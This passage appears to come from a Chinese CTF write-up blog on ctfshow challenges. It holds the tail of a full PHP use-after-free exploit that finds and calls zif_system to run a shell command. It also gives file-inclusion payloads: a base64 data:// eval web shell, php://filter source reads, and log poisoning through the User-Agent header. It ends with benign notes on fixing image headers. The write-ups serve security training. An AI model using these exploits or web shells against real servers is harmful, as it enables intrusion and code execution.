class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>        <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>        <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>    <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>    <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>​    <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>​    <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>​    <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>​    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>​        <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>​        <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>​        <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>​        <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>​        <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>​        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br><br>​            <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>​            <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>​        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>​            <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>​        &#125;<br>​    &#125;<br><br>​    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>​        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>​    <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>            <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>            <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                <span class="hljs-keyword">continue</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>​        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>​        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>​            <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>​            <br>​            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>​                <span class="hljs-keyword">continue</span>;<br>​        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>​        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>​    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>    <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>    <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>        <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>​        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>​            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>​        &#125;<br>​        <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>​    &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>​    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>​    <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>​    <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>​    <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br><span class="hljs-variable">$contiguous</span> = [];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>    <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br><span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br><span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br><span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br><span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br><span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br><span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>&#125;<br><br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br><br>(<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-keyword">exit</span>();<br><br>&#125;<br><br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020682.gif" alt="img"></p><h3 id="Web73"><a href="#Web73" class="headerlink" title="Web73"></a>Web73</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020884.gif" alt="img"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020022.gif" alt="img"></p><blockquote><p>还是glob遍历</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020067.gif" alt="img"></p><p>用上脚本发现strlen被ban了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020097.gif" alt="img"></p><blockquote><p>看其他师傅的wp include是没有被ban掉的 做题定向思维了 这应该是非预期解了</p></blockquote><h3 id="Web74"><a href="#Web74" class="headerlink" title="Web74"></a>Web74</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020282.gif" alt="img"> </p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020339.gif" alt="img"></p><blockquote><p>和上一题一样</p></blockquote><h3 id="Web75"><a href="#Web75" class="headerlink" title="Web75"></a>Web75</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020432.gif" alt="img"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020507.gif" alt="img"></p><blockquote><p>这道题是用了pdo连接mysql操作方法 不是特别明白 先跳过</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含刷题</title>
      <link href="/2023/05/29/web/web4/"/>
      <url>/2023/05/29/web/web4/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301443215.png" alt="image-20230530144343183"></p><blockquote><p>文件包含常规题 考虑伪协议绕过 这道题没有啥过滤的直接读就行</p><p>payload：</p><p>（1）?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;（base64过后的&lt;?php eval($_POST[1]);）</p><p>POST ：1&#x3D;system(“cat * f *”);</p><p>（2）?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><h3 id="Web79"><a href="#Web79" class="headerlink" title="Web79"></a>Web79</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352058.png" alt="img"></p><blockquote><p>该题目意思是将php replace成？？？所以无法直接包含flag.php </p><p>这边可以使用data伪协议绕过</p></blockquote><blockquote><p>1.data协议</p></blockquote><blockquote><p>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码</p></blockquote><blockquote><p>使用方法:data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)</p></blockquote><blockquote><p>data伪协议只有在php&lt;5.3且include&#x3D;on时可以写木马。</p></blockquote><blockquote><p>2.php伪协议：</p></blockquote><blockquote><p>需要开启allow_url_fopen的：php:&#x2F;&#x2F;input（post请求提交数据）、php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory和php:&#x2F;&#x2F;temp</p></blockquote><blockquote><p>不需要开启allow_wrl_fopen的：php:&#x2F;&#x2F;filter 用于读取源码</p></blockquote><blockquote><p>经常使用的是php:&#x2F;&#x2F;filter 用于读取源码 和php:&#x2F;&#x2F;input 用于执行php代码</p></blockquote><h3 id="Web80"><a href="#Web80" class="headerlink" title="Web80"></a>Web80</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352092.png" alt="img"></p><blockquote><p>data 和 php 被过滤所以data和伪协议用不了</p></blockquote><blockquote><p>用包含日志文件方法 大概意思就是</p><p>1、日志的默认路径</p></blockquote><blockquote><p> &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_log或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log    &#x2F;&#x2F;apache+linux</p></blockquote><blockquote><p> nginx 日志文件在用户安装目录的logs目录下&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p></blockquote><blockquote><p>2、web中间件默认配置uoh文件</p></blockquote><blockquote><p>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf或index.php?page&#x3D;&#x2F;etc&#x2F;init.d&#x2F;httpd    &#x2F;&#x2F;apache+linux</p></blockquote><blockquote><p>C:&#x2F;Windows&#x2F;system32&#x2F;inetsrv&#x2F;metabase.xml     &#x2F;&#x2F;iis6.0+win2003</p></blockquote><blockquote><p>C:WindowsSystem32inetsrvconfigapplicationHost.config      &#x2F;&#x2F;iis7.0+win</p></blockquote><blockquote><p>3、利用</p></blockquote><blockquote><p> 方法1 访问</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://www.xx.com/</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">时，</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：</span><br></code></pre></td></tr></table></figure></blockquote><blockquote><p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log找到日志文件，并以php解析的方式打开</p></blockquote><blockquote><p>方法2 可以添加php语句 到user_agent（User Agent中文名为用户代理，是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。它是一个特殊字符串头，是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。通过这个标 识，用户所访问的网站可以显示不同的排版从而为用户提供更好的体验或者进行信息统计；例如用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的 UA来判断的。）中</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301530825.png" alt="image-20230530153049671"></p><h3 id="Web81"><a href="#Web81" class="headerlink" title="Web81"></a>Web81</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352097.png" alt="img"></p><blockquote><p>多过滤了：不影响包含日志文件的尝试用上一题解决方法</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352122.png" alt="img"></p><blockquote><p>一般都是能够通过日志包含来写的</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc刷题（文件结构）</title>
      <link href="/2023/05/29/misc/misc2/"/>
      <url>/2023/05/29/misc/misc2/</url>
      
        <content type="html"><![CDATA[<h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><h3 id="misc24"><a href="#misc24" class="headerlink" title="misc24"></a>misc24</h3><blockquote><p>考察了bmp文件头和文件体</p></blockquote><blockquote><p><strong><a href="https://blog.csdn.net/whl0071/article/details/126976920">bmp文件详解</a></strong></p></blockquote><blockquote><p>bmp文件头是以位图格式：424d 然后其他的参数都是从后往前读的 具体看下图</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717695.jpg" alt="img"></p><blockquote><p>注意像素是文件体的字节数&#x2F;3 （三原色）像素也等于图像宽×图像高 这道题是图像的长×高不对，提示是<strong>flag<strong><strong>在图片上面。</strong></strong>宽是对的，根据像素推导高，然后在位图里改，最后导出就好</strong></p></blockquote><h3 id="misc25"><a href="#misc25" class="headerlink" title="misc25"></a>misc25</h3><blockquote><p>考察png文件格式</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717699.jpg" alt="img"></p><blockquote><p><strong>Png有crc校验</strong> </p></blockquote><blockquote><p>图片的<a href="https://so.csdn.net/so/search?q=crc%E6%A0%A1%E9%AA%8C&spm=1001.2101.3001.7020">crc校验</a>值由从第12个字节到第28个字节的十七位字节进行crc计算得到</p></blockquote><blockquote><p>所以拿到png图的题时应当先校验crc</p></blockquote><blockquote><p>49 48 44 52 00 00 03 84 00 00 00 96 08 02 00 00 00</p></blockquote><blockquote><p>这里使用脚本去根据crc校验值去爆破图像的宽高(脚本都在test.py中)</p></blockquote><h3 id="misc26"><a href="#misc26" class="headerlink" title="misc26"></a>misc26</h3><blockquote><p>Png文件同25题去跑脚本</p></blockquote><h3 id="misc27"><a href="#misc27" class="headerlink" title="misc27"></a>misc27</h3><blockquote><p>考点时jpg文件格式 这个参考</p></blockquote><blockquote><p><strong><a href="https://blog.csdn.net/weixin_40673765/article/details/118786341">jpg文件格式</a></strong>               <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717712.gif" alt="img"></p></blockquote><blockquote><p>Jpg文件宽高是在4中 所以需要修改宽高时可以直接查找FFC0 6-7位是高 8-9位是宽</p></blockquote><blockquote><p>当什么提示flag在下面上面就修改高 宽看题目意思修改</p></blockquote><blockquote><p><em><strong>Jpg的宽高是先高后宽</strong></em> </p></blockquote><blockquote><p>在第四块区域中0008 0008 是高和宽 注意要倒着看</p></blockquote><h3 id="misc28"><a href="#misc28" class="headerlink" title="misc28"></a>misc28</h3><blockquote><p><a href="https://www.jianshu.com/p/4fabac6b15b3">GIF 字节格式</a></p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717050.gif" alt="img"></p><blockquote><p>474946383961 文件头后是宽高 </p></blockquote><blockquote><p><strong>注意点</strong> 还有 Image Seperator里的下一帧宽高也需要改</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717123.gif" alt="img"></p><blockquote><p>这里插一句 gif动图是一帧一帧图片结合起来的 所以每一帧动图都会有Graphics Control Extension 和 Image Descriptor 9021 F9 04 01 32 00 02 00 2C 00 00 00 00 84 03 96 00 87</p></blockquote><blockquote><p>所以呢 改图片需要将整合图片的宽高和每一帧的宽高都要一起改</p></blockquote><blockquote><p>我直接搜索相同宽高一起改就完事了（跟bmp图片文件一样 宽高是倒的 倒着读就行）</p></blockquote><blockquote><p>这里引入stegsolve 图片查看器 </p></blockquote><h3 id="misc29"><a href="#misc29" class="headerlink" title="misc29"></a>misc29</h3><blockquote><p>也是gif文件格式 根据题目修改高 记得每一帧的高都要修改</p></blockquote><blockquote><p>保存以后发现是一张动图，这里就用到了stegsolve工具 analyse模块中frame browser （动图帧格式预览）一帧一帧查看 就获得了 </p></blockquote><h3 id="misc30"><a href="#misc30" class="headerlink" title="misc30"></a>misc30</h3><blockquote><p>还是bmp图片格式 所以按照题目要求修改 宽度950 